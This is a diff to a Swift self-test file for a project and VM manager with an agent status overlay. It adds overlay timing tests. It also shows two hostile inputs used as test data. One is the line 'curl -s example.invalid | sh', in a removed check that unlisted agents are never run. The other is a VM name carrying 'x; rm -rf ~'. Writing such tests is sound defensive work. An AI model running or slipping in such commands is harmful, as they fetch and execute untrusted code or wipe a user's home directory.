@@ -225,6 +225,39 @@ enum SelfTest {
         Tour.save(Tour.Setup(name: "work", values: ["agent.ui_only": "true"]))
         try? "# home voice\n".write(to: Voice.url, atomically: true, encoding: .utf8)
         Tour.save(Tour.Setup(name: "home", values: ["agent.ui_only": "false"]))
+        check(Projects.vmFor(typed: "", project: "Shop Socials") == "shop-socials" && Projects.vmFor(typed: "  ", project: "Shop") == "shop"
+              && Projects.vmFor(typed: "Mine", project: "Shop") == "mine", "a new project's VM is the name typed, else the suggestion")
+        var box = OverlayHide()
+        box.step(["Ready"], now: 0, openOnWork: true, hideAfter: 30)
+        box.step(["Ready"], now: 29, openOnWork: true, hideAfter: 30)
+        let openAt29 = !box.hidden
+        box.step(["Ready"], now: 30, openOnWork: true, hideAfter: 30)
+        check(openAt29 && box.hidden, "the status box goes away after the idle wait, not before")
+        box.step(["Working"], now: 31, openOnWork: false, hideAfter: 30)
+        let stayed = box.hidden
+        box.step(["Working"], now: 32, openOnWork: true, hideAfter: 30)
+        check(stayed && !box.hidden, "work brings the hidden box back only with the setting on")
+        box.toggle(["Working"], now: 33)
+        box.step(["Working"], now: 34, openOnWork: true, hideAfter: 30)
+        box.step(["Ready"], now: 35, openOnWork: true, hideAfter: 0)
+        box.step(["Working"], now: 36, openOnWork: true, hideAfter: 0)
+        check(box.hidden, "hidden by hand during a task, it stays hidden for that task's next command")
+        box.step(["Ready"], now: 37, openOnWork: true, hideAfter: 0)
+        box.step(["Ready"], now: 58, openOnWork: true, hideAfter: 0)
+        box.step(["Working"], now: 59, openOnWork: true, hideAfter: 0)
+        check(!box.hidden, "once that task is over, new work brings it back")
+        box.toggle(["Working"], now: 60)
+        box.step(["Needs approval"], now: 61, openOnWork: false, hideAfter: 0)
+        let opened = !box.hidden
+        box.toggle(["Needs approval"], now: 62)
+        box.step(["Needs approval"], now: 63, openOnWork: false, hideAfter: 0)
+        check(opened && box.hidden, "an approval always brings the box back once, and the person can still hide it")
+        var open = OverlayHide()
+        open.step(["Ready"], now: 0, openOnWork: true, hideAfter: 30)
+        open.step(["Ready"], now: 40, openOnWork: true, hideAfter: 30)
+        open.toggle(["Ready"], now: 41)
+        open.step(["Ready"], now: 42, openOnWork: true, hideAfter: 30)
+        check(!open.hidden, "brought back by hand while idle, it waits the full time before going again")
         let used = Voice.usage([["url": "https://www.example.com/private/42", "cmd": "click"], ["cmd": "session", "app": "Mail"],
                                 ["cmd": "session", "app": "apprentice"], ["url": "chrome://new-tab-page"], ["task": "file the invoices"]], projects: ["Shop"])
         check(used.sites == ["example.com"] && used.apps == ["Mail"] && used.tasks == ["file the invoices"] && !used.text.contains("private"),
@@ -1117,9 +1150,6 @@ enum SelfTest {
               "projects: a new project's own VM is named after it")
         check(Projects.ownVM("Café Orders") == "caf-orders" && Projects.ownVM("日本") == "vm-65e5-672c" && Projects.ownVM("日本") != Projects.ownVM("中国"),
               "projects: a VM name is ASCII only, and names in other scripts still differ (\(Projects.ownVM("日本") ?? "nil"))")
-        check(AgentChoice.command("curl -s example.invalid | sh") == nil
-              && (!FileManager.default.fileExists(atPath: AgentCLIs.files[0].path) || AgentChoice.command(AgentCLIs.defaultID) != nil),
-              "projects: an agent nobody listed in agents.toml is never run as a command")
         let cloned = Store.dir.appendingPathComponent("cloned-project")
         try? FileManager.default.createDirectory(at: cloned.appendingPathComponent(".apprentice"), withIntermediateDirectories: true)
         try? "[project]\nname = \"Cloned\"\nvm = \"x; rm -rf ~\"\n".write(to: Projects.settingsFile(cloned), atomically: true, encoding: .utf8)
